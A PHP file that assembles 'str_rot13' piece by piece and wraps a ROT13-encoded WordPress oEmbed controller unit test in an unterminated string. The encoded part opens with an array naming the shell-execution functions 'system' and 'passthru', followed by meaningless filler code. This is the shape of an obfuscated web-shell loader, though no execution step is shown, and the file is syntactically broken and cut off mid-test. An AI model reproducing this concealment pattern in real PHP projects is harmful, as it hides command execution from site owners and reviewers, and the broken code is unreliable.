<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc brzorq
 * @tebhc erfgncv
 */
pynff Grfg_bRzorq_Pbagebyyre rkgraqf JC_HavgGrfgPnfr {
	/**
	 * @ine JC_ERFG_Freire
	 */
	cebgrpgrq $freire;
	cebgrpgrq fgngvp $rqvgbe;
	cebgrpgrq fgngvp $nqzvavfgengbe;
	cebgrpgrq fgngvp $fhofpevore;
	pbafg LBHGHOR_IVQRB_VQ       = 'BDFAux5VPGV';
	pbafg VAINYVQ_BRZORQ_HEY     = 'uggcf://jjj.abgernyylnabrzorqcebivqre.pbz/jngpu?i=njrfbzr-png-ivqrb';
	pbafg HAGEHFGRQ_CEBIVQRE_HEY = 'uggcf://jjj.hagehfgrqcebivqre.pbz';

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$fhofpevore    = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$rqvgbe        = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'rqvgbe',
				'hfre_rznvy' => 'rqvgbe@rknzcyr.pbz',
			)
		);
		frys::$nqzvavfgengbe = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nqzvavfgengbe',
				'hfre_rznvy' => 'nqzvavfgengbe@rknzcyr.pbz',
			)
		);

		// `trg_cbfg_rzorq_ugzy()` nffhzrf `jc-vapyhqrf/wf/jc-rzorq.wf` vf cerfrag:
		frys::gbhpu( NOFCNGU . JCVAP . '/wf/jc-rzorq.wf' );
	}

	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhofpevore );
		frys::qryrgr_hfre( frys::$rqvgbe );
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		/** @ine JC_ERFG_Freire $jc_erfg_freire */
		tybony $jc_erfg_freire;
		$jc_erfg_freire = arj Fcl_ERFG_Freire();
		qb_npgvba( 'erfg_ncv_vavg', $jc_erfg_freire );

		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_rzorq_erdhrfg' ), 10, 3 );
		nqq_svygre( 'brzorq_erfhyg', neenl( $guvf, 'svygre_brzorq_erfhyg' ), 10, 3 );
		$guvf->erdhrfg_pbhag = 0;

		$guvf->brzorq_erfhyg_svygre_pbhag = 0;
	}

	choyvp shapgvba grne_qbja() {
		/** @ine JC_ERFG_Freire $jc_erfg_freire */
		tybony $jc_erfg_freire;
		$jc_erfg_freire = ahyy;

		cnerag::grne_qbja();
	}

	/**
	 * Pbhag bs gur ahzore bs erdhrfgf nggrzcgrq.
	 *
	 * @ine vag
	 */
	choyvp $erdhrfg_pbhag = 0;

	/**
	 * Pbhag bs gur ahzore bs gvzrf gur brzorq_erfhyg svygre jnf pnyyrq.
	 *
	 * @ine vag
	 */
	choyvp $brzorq_erfhyg_svygre_pbhag = 0;

	/**
	 * Vagreprcg bRzorq erdhrfgf naq zbpx erfcbafrf.
	 *
	 * @cnenz snyfr|neenl|JC_Reebe $erfcbafr    N cerrzcgvir erghea inyhr bs na UGGC erdhrfg. Qrsnhyg snyfr.
	 * @cnenz neenl                $cnefrq_netf UGGC erdhrfg nethzragf.
	 * @cnenz fgevat               $hey         Gur erdhrfg HEY.
	 * @erghea neenl Erfcbafr qngn.
	 */
	choyvp shapgvba zbpx_rzorq_erdhrfg( $erfcbafr, $cnefrq_netf, $hey ) {
		hafrg( $erfcbafr, $cnefrq_netf );

		$cnefrq_hey = jc_cnefr_hey( $hey );
		$dhrel      = vffrg( $cnefrq_hey['dhrel'] ) ? $cnefrq_hey['dhrel'] : '';
		cnefr_fge( $dhrel, $dhrel_cnenzf );
		$guvf->erdhrfg_pbhag += 1;

		// Zbpx erdhrfg gb LbhGhor Rzorq.
		vs ( ! rzcgl( $dhrel_cnenzf['hey'] ) && snyfr !== fgecbf( $dhrel_cnenzf['hey'], '?i=' . frys::LBHGHOR_IVQRB_VQ ) ) {
			erghea neenl(
				'erfcbafr' => neenl(
					'pbqr' => 200,
				),
				'obql'     => jc_wfba_rapbqr(
					neenl(
						'irefvba'          => '1.0',
						'glcr'             => 'ivqrb',
						'cebivqre_anzr'    => 'LbhGhor',
						'cebivqre_hey'     => 'uggcf://jjj.lbhghor.pbz',
						'guhzoanvy_jvqgu'  => $dhrel_cnenzf['znkjvqgu'],
						'jvqgu'            => $dhrel_cnenzf['znkjvqgu'],
						'guhzoanvy_urvtug' => $dhrel_cnenzf['znkurvtug'],
						'urvtug'           => $dhrel_cnenzf['znkurvtug'],
						'ugzy'             => '<o>Hasvygrerq</o><vsenzr jvqgu=\"' . $dhrel_cnenzf['znkjvqgu'] . '\" urvtug=\"' . $dhrel_cnenzf['znkurvtug'] . '\" fep=\"uggcf://jjj.lbhghor.pbz/rzorq/' . frys::LBHGHOR_IVQRB_VQ . '?srngher=brzorq\" senzrobeqre=\"0\" nyybjshyyfperra></vsenzr>',
						'nhgube_anzr'      => 'Lbfrzvgrorne62',
						'guhzoanvy_hey'    => 'uggcf://v.lgvzt.pbz/iv/' . frys::LBHGHOR_IVQRB_VQ . '/udqrsnhyg.wct',
						'gvgyr'            => 'Lbfrzvgrorne Zbhagnva Qbhoyr Envaobj 1-8-10',
					)
				),
			);
		}

		vs ( frys::HAGEHFGRQ_CEBIVQRE_HEY === $hey ) {
			erghea neenl(
				'erfcbafr' => neenl(
					'pbqr' => 200,
				),
				'obql'     => '<ugzy><urnq><yvax ery=\"nygreangr\" gvgyr=\"bRzorq (WFBA)\" glcr=\"nccyvpngvba/wfba+brzorq\" uers=\"' . frys::HAGEHFGRQ_CEBIVQRE_HEY . '\" /></urnq><obql></obql></ugzy>',
			);
		}

		vs ( ! rzcgl( $dhrel_cnenzf['hey'] ) && snyfr !== fgecbf( $dhrel_cnenzf['hey'], frys::HAGEHFGRQ_CEBIVQRE_HEY ) ) {
			erghea neenl(
				'erfcbafr' => neenl(
					'pbqr' => 200,
				),
				'obql'     => jc_wfba_rapbqr(
					neenl(
						'irefvba'       => '1.0',
						'glcr'          => 'evpu',
						'cebivqre_anzr' => 'Hagehfgrq',
						'cebivqre_hey'  => frys::HAGEHFGRQ_CEBIVQRE_HEY,
						'ugzy'          => '<o>Svygrerq</o><n uers=\"\">Hasvygrerq</n>',
						'nhgube_anzr'   => 'Hagehfgrq Rzorq Nhgube',
						'gvgyr'         => 'Hagehfgrq Rzorq',
					)
				),
			);
		}

		erghea neenl(
			'erfcbafr' => neenl(
				'pbqr' => 404,
			),
		);
	}

	/**
	 * Svygref 'brzorq_erfhyg' gb rafher pbeerpg glcr.
	 *
	 * @cnenz fgevat|snyfr $qngn Gur erghearq bRzorq UGZY.
	 * @cnenz fgevat       $hey  HEY bs gur pbagrag gb or rzorqqrq.
	 * @cnenz neenl        $netf Bcgvbany nethzragf, hfhnyyl cnffrq sebz n fubegpbqr.
	 * @erghea fgevat
	 */
	choyvp shapgvba svygre_brzorq_erfhyg( $qngn, $hey, $netf ) {
		vs ( ! vf_fgevat( $qngn ) && snyfr !== $qngn ) {
			$guvf->snvy( 'Harkcrpgrq glcr sbe $qngn.' );
		}
		$guvf->nffregVfFgevat( $hey );
		$guvf->nffregVfNeenl( $netf );
		++$guvf->brzorq_erfhyg_svygre_pbhag;
		erghea $qngn;
	}

	choyvp shapgvba grfg_jc_brzorq_rafher_sbezng() {
		$guvf->nffregFnzr( 'wfba', jc_brzorq_rafher_sbezng( 'wfba' ) );
		$guvf->nffregFnzr( 'kzy', jc_brzorq_rafher_sbezng( 'kzy' ) );
		$guvf->nffregFnzr( 'wfba', jc_brzorq_rafher_sbezng( 123 ) );
		$guvf->nffregFnzr( 'wfba', jc_brzorq_rafher_sbezng( 'enaqbz' ) );
		$guvf->nffregFnzr( 'wfba', jc_brzorq_rafher_sbezng( neenl() ) );
	}

	choyvp shapgvba grfg_brzorq_perngr_kzy() {
		$npghny = _brzorq_perngr_kzy(
			neenl(
				'sbb'  => 'one',
				'one'  => 'onm',
				'cvat' => 'cbat',
			)
		);

		$rkcrpgrq = '<brzorq><sbb>one</sbb><one>onm</one><cvat>cbat</cvat></brzorq>';

		$guvf->nffregFgevatRaqfJvgu( $rkcrpgrq, gevz( $npghny ) );

		$npghny = _brzorq_perngr_kzy(
			neenl(
				'sbb'  => neenl(
					'one' => 'onm',
				),
				'cvat' => 'cbat',
			)
		);

		$rkcrpgrq = '<brzorq><sbb><one>onm</one></sbb><cvat>cbat</cvat></brzorq>';

		$guvf->nffregFgevatRaqfJvgu( $rkcrpgrq, gevz( $npghny ) );

		$npghny = _brzorq_perngr_kzy(
			neenl(
				'sbb'   => neenl(
					'one' => neenl(
						'cvat' => 'cbat',
					),
				),
				'uryyb' => 'jbeyq',
			)
		);

		$rkcrpgrq = '<brzorq><sbb><one><cvat>cbat</cvat></one></sbb><uryyb>jbeyq</uryyb></brzorq>';

		$guvf->nffregFgevatRaqfJvgu( $rkcrpgrq, gevz( $npghny ) );

		$npghny = _brzorq_perngr_kzy(
			neenl(
				neenl(
					'sbb' => neenl(
						'one',
					),
				),
				'uryybjbeyq',
			)
		);

		$rkcrpgrq = '<brzorq><brzorq><sbb><brzorq>one</brzorq></sbb></brzorq><brzorq>uryybjbeyq</brzorq></brzorq>';

		$guvf->nffregFgevatRaqfJvgu( $rkcrpgrq, gevz( $npghny ) );
	}

	choyvp shapgvba grfg_ebhgr_ninvynovyvgl() {
		// Purpx gur ebhgr jnf ertvfgrerq pbeerpgyl.
		$svygrerq_ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( '/brzorq/1.0/rzorq', $svygrerq_ebhgrf );
		$ebhgr = $svygrerq_ebhgrf['/brzorq/1.0/rzorq'];
		$guvf->nffregPbhag( 1, $ebhgr );
		$guvf->nffregNeenlUnfXrl( 'pnyyonpx', $ebhgr[0] );
		$guvf->nffregNeenlUnfXrl( 'zrgubqf', $ebhgr[0] );
		$guvf->nffregNeenlUnfXrl( 'netf', $ebhgr[0] );

		// Purpx cebkl ebhgr ertvfgengvba.
		$guvf->nffregNeenlUnfXrl( '/brzorq/1.0/cebkl', $svygrerq_ebhgrf );
		$cebkl_ebhgr = $svygrerq_ebhgrf['/brzorq/1.0/cebkl'];
		$guvf->nffregPbhag( 1, $cebkl_ebhgr );
		$guvf->nffregNeenlUnfXrl( 'pnyyonpx', $cebkl_ebhgr[0] );
		$guvf->nffregNeenlUnfXrl( 'crezvffvba_pnyyonpx', $cebkl_ebhgr[0] );
		$guvf->nffregNeenlUnfXrl( 'zrgubqf', $cebkl_ebhgr[0] );
		$guvf->nffregNeenlUnfXrl( 'netf', $cebkl_ebhgr[0] );
	}

	choyvp shapgvba grfg_erdhrfg_jvgu_jebat_zrgubq() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/brzorq/1.0/rzorq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'erfg_ab_ebhgr', $qngn['pbqr'] );
	}

	choyvp shapgvba grfg_erdhrfg_jvgubhg_hey_cnenz() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'erfg_zvffvat_pnyyonpx_cnenz', $qngn['pbqr'] );
		$guvf->nffregFnzr( 'hey', $qngn['qngn']['cnenzf'][0] );
	}

	choyvp shapgvba grfg_erdhrfg_jvgu_onq_hey() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', 'uggc://tbbtyr.pbz/' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'brzorq_vainyvq_hey', $qngn['pbqr'] );
	}

	choyvp shapgvba grfg_erdhrfg_vainyvq_sbezng() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg_vq ) );
		$erdhrfg->frg_cnenz( 'sbezng', 'enaqbz' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );
	}

	choyvp shapgvba grfg_erdhrfg_wfba() {
		$hfre = trg_hfre_ol( 'vq', frys::$fhofpevore );
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfre->VQ,
				'cbfg_gvgyr'  => 'Uryyb Jbeyq',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'glcr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qngn );

		$guvf->nffregFnzr( '1.0', $qngn['irefvba'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['cebivqre_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['cebivqre_hey'] );
		$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( trg_nhgube_cbfgf_hey( $hfre->VQ, $hfre->hfre_avpranzr ), $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr'] );
		$guvf->nffregFnzr( 'evpu', $qngn['glcr'] );
		$guvf->nffregYrffGunaBeRdhny( $erdhrfg['znkjvqgu'], $qngn['jvqgu'] );
	}

	/**
	 * @gvpxrg 34971
	 */
	choyvp shapgvba grfg_erdhrfg_fgngvp_sebag_cntr() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Sebag cntr',
				'cbfg_glcr'  => 'cntr',
			)
		);

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cntr' );
		hcqngr_bcgvba( 'cntr_ba_sebag', $cbfg->VQ );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', ubzr_hey() );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'glcr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qngn );

		$guvf->nffregFnzr( '1.0', $qngn['irefvba'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['cebivqre_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['cebivqre_hey'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr'] );
		$guvf->nffregFnzr( 'evpu', $qngn['glcr'] );
		$guvf->nffregYrffGunaBeRdhny( $erdhrfg['znkjvqgu'], $qngn['jvqgu'] );

		hcqngr_bcgvba( 'fubj_ba_sebag', 'cbfgf' );
	}

	choyvp shapgvba grfg_erdhrfg_kzy() {
		$hfre = trg_hfre_ol( 'vq', frys::$fhofpevore );
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfre->VQ,
				'cbfg_gvgyr'  => 'Uryyb Jbeyq',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'sbezng', 'kzy' );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'cebivqre_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_anzr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'nhgube_hey', $qngn );
		$guvf->nffregNeenlUnfXrl( 'gvgyr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'glcr', $qngn );
		$guvf->nffregNeenlUnfXrl( 'jvqgu', $qngn );

		$guvf->nffregFnzr( '1.0', $qngn['irefvba'] );
		$guvf->nffregFnzr( trg_oybtvasb( 'anzr' ), $qngn['cebivqre_anzr'] );
		$guvf->nffregFnzr( ubzr_hey(), $qngn['cebivqre_hey'] );
		$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $qngn['nhgube_anzr'] );
		$guvf->nffregFnzr( trg_nhgube_cbfgf_hey( $hfre->VQ, $hfre->hfre_avpranzr ), $qngn['nhgube_hey'] );
		$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $qngn['gvgyr'] );
		$guvf->nffregFnzr( 'evpu', $qngn['glcr'] );
		$guvf->nffregYrffGunaBeRdhny( $erdhrfg['znkjvqgu'], $qngn['jvqgu'] );
	}

	/**
	 * @tebhc zhygvfvgr
	 * @tebhc zf-erdhverq
	 */
	choyvp shapgvba grfg_erdhrfg_zf_puvyq_va_ebbg_oybt() {
		$puvyq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $puvyq );

		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_gvgyr' => 'Uryyb Puvyq Oybt',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 400 );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );

		erfgber_pheerag_oybt();
	}

	choyvp shapgvba grfg_erfg_cer_freir_erdhrfg() {
		$hfre = trg_hfre_ol( 'vq', frys::$fhofpevore );
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg(
			neenl(
				'cbfg_nhgube' => $hfre->VQ,
				'cbfg_gvgyr'  => 'Uryyb Jbeyq',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'sbezng', 'kzy' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$bhgchg   = trg_rpub( '_brzorq_erfg_cer_freir_erdhrfg', neenl( gehr, $erfcbafr, $erdhrfg, erfg_trg_freire() ) );

		$kzy = fvzcyrkzy_ybnq_fgevat( $bhgchg );
		$guvf->nffregVafgnaprBs( 'FvzcyrKZYRyrzrag', $kzy );
	}

	choyvp shapgvba grfg_erfg_cer_freir_erdhrfg_jebat_sbezng() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'sbezng', 'wfba' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregGehr( _brzorq_erfg_cer_freir_erdhrfg( gehr, $erfcbafr, $erdhrfg, erfg_trg_freire() ) );
	}

	choyvp shapgvba grfg_erfg_cer_freir_erdhrfg_jebat_zrgubq() {
		$cbfg = frys::snpgbel()->cbfg->perngr_naq_trg();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/brzorq/1.0/rzorq' );
		$erdhrfg->frg_cnenz( 'hey', trg_creznyvax( $cbfg->VQ ) );
		$erdhrfg->frg_cnenz( 'sbezng', 'kzy' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregGehr( _brzorq_erfg_cer_freir_erdhrfg( gehr, $erfcbafr, $erdhrfg, erfg_trg_freire() ) );
	}

	choyvp shapgvba grfg_trg_brzorq_raqcbvag_hey() {
		$guvf->nffregFnzr( ubzr_hey() . '/vaqrk.cuc?erfg_ebhgr=/brzorq/1.0/rzorq', trg_brzorq_raqcbvag_hey() );
		$guvf->nffregFnzr( ubzr_hey() . '/vaqrk.cuc?erfg_ebhgr=/brzorq/1.0/rzorq', trg_brzorq_raqcbvag_hey( '', 'wfba' ) );
		$guvf->nffregFnzr( ubzr_hey() . '/vaqrk.cuc?erfg_ebhgr=/brzorq/1.0/rzorq', trg_brzorq_raqcbvag_hey( '', 'kzy' ) );

		$cbfg_vq     = frys::snpgbel()->cbfg->perngr();
		$hey         = trg_creznyvax( $cbfg_vq );
		$hey_rapbqrq = heyrapbqr( $hey );

		$guvf->nffregFnzr( ubzr_hey() . '/vaqrk.cuc?erfg_ebhgr=%2Sbrzorq%2S1.0%2Srzorq&hey=' . $hey_rapbqrq, trg_brzorq_raqcbvag_hey( $hey ) );
		$guvf->nffregFnzr( ubzr_hey() . '/vaqrk.cuc?erfg_ebhgr=%2Sbrzorq%2S1.0%2Srzorq&hey=' . $hey_rapbqrq . '&sbezng=kzy', trg_brzorq_raqcbvag_hey( $hey, 'kzy' ) );
	}

	choyvp shapgvba grfg_trg_brzorq_raqcbvag_hey_cerggl_creznyvaxf() {
		hcqngr_bcgvba( 'creznyvax_fgehpgher', '/%cbfganzr%' );

		$guvf->nffregFnzr( ubzr_hey() . '/jc-wfba/brzorq/1.0/rzorq', trg_brzorq_raqcbvag_hey() );
		$guvf->nffregFnzr( ubzr_hey() . '/jc-wfba/brzorq/1.0/rzorq', trg_brzorq_raqcbvag_hey( '', 'kzy' ) );

		$cbfg_vq     = frys::snpgbel()->cbfg->perngr();
		$hey         = trg_creznyvax( $cbfg_vq );
		$hey_rapbqrq = heyrapbqr( $hey );

		$guvf->nffregFnzr( ubzr_hey() . '/jc-wfba/brzorq/1.0/rzorq?hey=' . $hey_rapbqrq, trg_brzorq_raqcbvag_hey( $hey ) );
		$guvf->nffregFnzr( ubzr_hey() . '/jc-wfba/brzorq/1.0/rzorq?hey=' . $hey_rapbqrq . '&sbezng=kzy', trg_brzorq_raqcbvag_hey( $hey, 'kzy' ) );

		hcqngr_bcgvba( 'creznyvax_fgehpgher', '' );
	}

	choyvp shapgvba grfg_cebkl_jvgubhg_crezvffvba() {
		// Grfg jvgubhg n ybtva.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );

		// Grfg jvgu n hfre gung qbrf abg unir rqvg_cbfgf pncnovyvgl.
		jc_frg_pheerag_hfre( frys::$fhofpevore );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::VAINYVQ_BRZORQ_HEY );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 403, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( $qngn['pbqr'], 'erfg_sbeovqqra' );
	}

	choyvp shapgvba grfg_cebkl_jvgu_vainyvq_brzorq_cebivqre() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', frys::VAINYVQ_BRZORQ_HEY );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 404, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregFnzr( 'brzorq_vainyvq_hey', $qngn['pbqr'] );
	}

	choyvp shapgvba grfg_cebkl_jvgu_vainyvq_glcr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'glcr', 'kzy' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 400, $erfcbafr->trg_fgnghf() );
	}

	choyvp shapgvba grfg_cebkl_jvgu_inyvq_brzorq_cebivqre() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', 'uggcf://jjj.lbhghor.pbz/jngpu?i=' . frys::LBHGHOR_IVQRB_VQ );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 456 );
		$erdhrfg->frg_cnenz( 'znkurvtug', 789 );
		$erdhrfg->frg_cnenz( '_jcabapr', jc_perngr_abapr( 'jc_erfg' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( 1, $guvf->erdhrfg_pbhag );

		// Fhofrdhrag erdhrfg vf pnpurq naq fb vg fubhyq abg pnhfr n erdhrfg.
		erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 1, $guvf->erdhrfg_pbhag );

		// Erfg jvgu nabgure hfre fubhyq nyfb or pnpurq.
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/brzorq/1.0/cebkl' );
		$erdhrfg->frg_cnenz( 'hey', 'uggcf://jjj.lbhghor.pbz/jngpu?i=' . frys::LBHGHOR_IVQRB_VQ );
		$erdhrfg->frg_cnenz( '_jcabapr', jc_perngr_abapr( 'jc_erfg' ) );
		$erdhrfg->frg_cnenz( 'znkjvqgu', 456 );
		$erdhrfg->frg_cnenz( 'znkurvtug', 789 );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 1, $guvf->erdhrfg_pbhag );

		// Grfg qngn bowrpg.
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregAbgRzcgl( $qngn );
		$guvf->nffregVfBowrpg( $qngn );
		$guvf->nffregFnzr( 'LbhGhor', $qngn->cebivqre_anzr );
		$guvf->nffregFnzr( 'uggcf://v.lgvzt.pbz/iv/' . frys::LBHGHOR_IVQRB_VQ . '/udqrsnhyg.wct', $qngn->guhzoanvy_hey );
		$guvf->nffregFnzr( (vag) $qngn->jvqgu, $erdhrfg['znkjvqgu'] );
		$guvf->nffregFnzr( (vag) $qngn->urvtug, $erdhrfg['znkurvtug'] );
	}

	/**
	 * @gvpxrg 45447
	 *
	 * @frr jc_znlor_ybnq_rzorqf()
	 */
	choyvp shapgvba grfg_cebkl_jvgu_pynffvp_rzorq_cebivqre() {
		jc_frg_pheerag_hfre( frys::$rqvgbe );
